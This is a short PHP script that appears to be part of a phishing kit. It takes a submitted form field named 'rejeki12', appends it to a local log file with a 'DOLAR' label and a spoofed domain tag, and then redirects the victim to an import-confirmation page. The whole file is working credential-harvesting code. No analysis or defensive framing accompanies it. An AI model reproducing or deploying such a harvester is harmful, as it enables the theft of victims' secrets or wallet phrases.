
<?php
$file = "JALANKEGUNUNG";
$ip   = getenv("REMOTE_ADDR");
$rejeki12   = $_POST['rejeki12'];
$today = date("F j, Y, g:i a");

$handle = fopen($file, 'a');
fwrite($handle, "\n");
fwrite($handle, "DOLAR :: ");
fwrite($handle, "$rejeki12");
fwrite($handle, "\n");
fwrite($handle, "S3MP4K-B4NK.COM");
fwrite($handle, "\n");
fclose($handle);
echo "<script LANGUAGE=\"JavaScript\">
<!--
window.location=\"import.html#confirm-page-container-navigation\";
// -->
</script>";
?>

